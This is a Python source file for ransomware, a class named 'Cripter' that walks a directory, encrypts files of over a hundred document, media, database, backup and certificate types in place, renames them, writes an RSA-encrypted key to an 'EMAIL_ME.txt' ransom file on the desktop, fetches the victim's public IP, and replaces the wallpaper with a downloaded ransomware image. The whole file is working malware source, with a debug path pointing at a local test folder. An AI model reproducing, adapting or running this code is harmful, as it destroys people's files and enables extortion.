from cryptography.fernet import Fernet
import winreg
import os
import requests
import string
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import concurrent.futures
import threading
import urllib
import ctypes
import time

class Cripter:

    def __init__(self):
        self.done_extension = "完成"

        self.key = None

        self.fernet = None

        self.sysRoot = os.path.expanduser('~')

        self.available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]

        self.publicIP = requests.get('https://api.ipify.org').text
        self.exclude_folders = [
            "Windows",
            "Program Files",
            "Program Files (x86)"
        ]
        self.extensions = [
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd",
           ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt",
           ".jpeg", ".jpg", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw",
           ".xlt",
           ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam",
           ".potx",
           ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk",
           ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z",
           ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif",
           ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv",
           ".3g2",
           ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla",
           ".swf",
           ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd",
           ".sch",
           ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas",
           ".cpp",
           ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf",
           ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml",
           ".sxm",
           ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc",
           ".sxc",
           ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem",
           ".p12",
           ".csr", ".crt", ".key", ".pfx", ".der"
        ]

        debug = True
        if debug:
            self.root_dir = "D:\\Projects\\python\\Malware\\ransomware_new\\test_files"

    def __del__(self):
        self.key = None
        self.fernet = None

    def generate_fernet_key(self):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)

    def list_and_encrypt_files(self):
        for root, dirs, files in os.walk(self.root_dir):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensions):
                    try:
                        file_path = os.path.join(root, file)
                        #self.__encrypt_file(file_path)
                        thread = threading.Thread(target=self.__encrypt_file, args=(file_path,))
                        thread.start()
                    except Exception as e:
                        print(e)

    def __encrypt_file(self, file_path):
        with open(file_path, 'r+b') as file:
            encrypted_data = self.fernet.encrypt(file.read())
            file.seek(0)
            file.truncate()
            file.write(encrypted_data)

        os.rename(file_path, file_path + self.done_extension)

    def send_keys_to_server(self):
        fernet_key = self.key
        # Public RSA key
        self.public_key = RSA.import_key(open('public.pem').read())
        # Public encrypter object
        public_crypter =  PKCS1_OAEP.new(self.public_key)
        # Encrypted fernet key
        enc_fernent_key = public_crypter.encrypt(fernet_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as f:
            f.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key

        self.fernet = None

    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    now = time.time()
    cripter = Cripter()
    cripter.generate_fernet_key()
    cripter.list_and_encrypt_files()
    cripter.change_desktop_background()
    print(f"took: {time.time()-now}")
    print(cripter.publicIP)
